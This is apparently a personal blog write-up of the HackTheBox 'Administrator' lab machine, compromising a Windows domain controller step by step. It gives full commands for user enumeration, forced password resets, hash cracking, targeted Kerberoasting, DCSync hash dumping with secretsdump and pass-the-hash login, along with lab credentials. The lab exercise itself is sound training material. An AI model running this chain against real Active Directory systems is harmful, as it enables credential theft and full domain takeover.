---
title: "Administrator"
date: 2026-03-04
draft: false
description: "HackTheBox Administrator writeup"
tags: ["hackthebox", "htb", "windows", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Administrator

## Overview

- **OS:** Windows
- **IP:** 10.129.16.22
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got creds, abused genericwrite then forechange pass and then cracked psafe file got creds, used it to abuse dsync nd got admin.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames | Olivia

michael
Benjamin
emily
ethan |
| Passwords | ichliebedich
Password
tekieromucho
UXLCI5iETUsIBoFVTj8yQFKoHjXmb
limpkizkit |
| Usernames+Passwords | Olivia:ichliebedich
michael:Password
benjamin:Password
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
ethan:limpkizkit |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
$ nmap 10.129.16.22 -sCV -A -Pn -p- --min-rate=20000                        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 22:47 EST
Warning: 10.129.16.22 giving up on port because retransmission cap hit (10).
Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 64.00% done; ETC: 22:48 (0:00:29 remaining)
Nmap scan report for 10.129.16.22
Host is up (0.099s latency).
Not shown: 65457 closed tcp ports (reset), 53 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
**21/tcp    open  ftp           Microsoft ftpd**
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
**88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-05 02:49:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC**
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
**5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)**
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
**47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0**
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
50789/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50794/tcp open  msrpc         Microsoft Windows RPC
50801/tcp open  msrpc         Microsoft Windows RPC
50814/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-05T02:50:38
|_  start_date: N/A
|_clock-skew: -57m48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   99.86 ms 10.10.14.1
2   97.71 ms 10.129.16.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.91 seconds

```

## Dirbusting

{{< figure src="image 505.png" >}}

Lets see what all we have access to with this user

{{< figure src="image 506.png" >}}

We got more users

{{< figure src="image 507.png" >}}

lets check for all if any cred reuse

ok so olivia seems to be the only legit cred then

## SMB

```
──(kali㉿kali)-[~/Desktop/Boxes/Administrator]
└─$ impacket-smbclient Olivia:ichliebedich@10.129.16.22
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
## ls
[-] No share selected
## shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
## cd IPC$
[-] No share selected
## use IPC$
## ls
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 InitShutdown
-rw-rw-rw-          5  Sun Dec 31 19:03:58 1600 lsass
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 ntsvcs
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 scerpc
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-2a8-0
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-398-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 epmapper
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-204-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 LSM_API_service
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-3d0-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 eventlog
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-4f4-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 atsvc
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-630-0
-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 wkssvc
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-2a8-1
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-6a4-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 RpcProxy\50789
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 30ce14a5eb4655a1
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 RpcProxy\593
-rw-rw-rw-          5  Sun Dec 31 19:03:58 1600 srvsvc
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 netdfs
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 tapsrv
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 vgauth-service
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 ROUTER
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-294-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 W32TIME_ALT
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-bdc-0
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-bc4-0
## cd ..
## shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
## use NETLOGON
## ls
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 .
drw-rw-rw-          0  Fri Oct  4 15:54:15 2024 ..
## use SYSVOL
## ls
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 .
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 ..
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 administrator.htb
## cd administrator.htb
## ls
drw-rw-rw-          0  Fri Oct  4 15:54:15 2024 .
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 ..
drw-rw-rw-          0  Wed Mar  4 21:49:38 2026 DfsrPrivate
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 Policies
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 scripts
## cd scripts
## ls
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 .
drw-rw-rw-          0  Fri Oct  4 15:54:15 2024 ..
## cd ..
## cd Policies
## ls
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 .
drw-rw-rw-          0  Fri Oct  4 15:54:15 2024 ..
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 {31B2F340-016D-11D2-945F-00C04FB984F9}
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 {6AC1786C-016F-11D2-945F-00C04fB984F9}
## cd ..
## cd DfsrPrivate
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
## ls
drw-rw-rw-          0  Fri Oct  4 15:54:15 2024 .
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 ..
drw-rw-rw-          0  Wed Mar  4 21:49:38 2026 DfsrPrivate
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 Policies
drw-rw-rw-          0  Fri Oct  4 15:49:22 2024 scripts
```

Nothing great here

## Roasting

{{< figure src="image 508.png" >}}

```
                                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/Boxes/Administrator]
└─$ ./kerbrute userenum --dc 10.129.16.22 -d administrator.htb users.txt -v

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/04/26 - Ronnie Flathers @ropnop

2026/03/04 23:09:47 >  Using KDC(s):
2026/03/04 23:09:47 >   10.129.16.22:88

2026/03/04 23:09:47 >  [+] VALID USERNAME:       Administrator@administrator.htb
2026/03/04 23:09:47 >  [!] krbtgt@administrator.htb - USER LOCKED OUT
2026/03/04 23:09:47 >  [!] Guest@administrator.htb - USER LOCKED OUT
2026/03/04 23:09:47 >  [!] emma@administrator.htb - USER LOCKED OUT
2026/03/04 23:09:47 >  [+] VALID USERNAME:       emily@administrator.htb
2026/03/04 23:09:47 >  [+] VALID USERNAME:       ethan@administrator.htb
2026/03/04 23:09:47 >  [+] VALID USERNAME:       benjamin@administrator.htb
2026/03/04 23:09:47 >  [+] VALID USERNAME:       michael@administrator.htb
2026/03/04 23:09:47 >  [!] alexander@administrator.htb - USER LOCKED OUT
2026/03/04 23:09:52 >  [+] VALID USERNAME:       Olivia@administrator.htb
2026/03/04 23:09:52 >  Done! Tested 10 usernames (6 valid) in 5.271 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/Boxes/Administrator]
└─$ 

```

validated the users

## Exploitation

after all those checks we can now begin w the winrm sesh

no interesting privs

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

{{< figure src="image 509.png" >}}

we have generic all over michael 

## Michael

lets go to michael

```
certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account management_svc

certipy-ad shadow auto \
-u Olivia@administrator.htb \
-p 'ichliebedich' \
-account michael \
-dc-ip 10.129.16.22 \
-target dc.administrator.htb

```

Well that does not seem to work, lets just use the abuse we see on bloodhound

```
net rpc password "michael" "Password" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "administrator.htb"
```

lets change his password

{{< figure src="image 510.png" >}}

great we got access to michael, lets see if michaels got any outbound

## Benjamin

{{< figure src="image 511.png" >}}

wow, we just gotta do the same thing now

```
net rpc password "benjamin" "Password" -U "administrator.htb"/"michael"%"Password" -S "administrator.htb"
```

ok so for some reason benjamin does not have a winrm shell, BUT he has ftp

{{< figure src="image 512.png" >}}

lets grab this file

{{< figure src="image 513.png" >}}

lets use pwsafe

{{< figure src="image 514.png" >}}

ahh lets check the shares as benjamin

nothing interesting on the shares

hmm lets try cracking the file

{{< figure src="image 515.png" >}}

now we can

{{< figure src="image 516.png" >}}

too much time lets just use hashcat instead

{{< figure src="image 517.png" >}}

lets use 5200

{{< figure src="image 518.png" >}}

```
tekieromucho
```

lets use this cred to open the database

{{< figure src="image 519.png" >}}

so we have these users out of these,  only emily is a valid user

so lets check her file

{{< figure src="image 520.png" >}}

these are the creds we have

for emily we have

```
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

now lets spray against emily

{{< figure src="image 521.png" >}}

we have now a winrm session as emilly

## Emily

{{< figure src="image 522.png" >}}

we have generic write over ethan

{{< figure src="image 523.png" >}}

lets try the targeted kerberoast

## Targeted Kerberoast

```
source venv/bin/activate
uv add --script targetedKerberoast.py -r requirements.txt 
sudo ntpdate administrator.htb
uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

or 

**python targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb**
```

{{< figure src="image 524.png" >}}

lets crack it

```
hashcat ethan.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.tx
```

aand we get

**limpkizkit** as the password for ethan

## Administrator

{{< figure src="image 525.png" >}}

so apparently ethan has DC sync over the administratorhtb domain

lets dump hashes for the domain with secretsdump

```
secretsdump.py ethan:limpbizkit@dc.administrator.htb
```

{{< figure src="image 526.png" >}}

lets pth and grab our files

```
evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
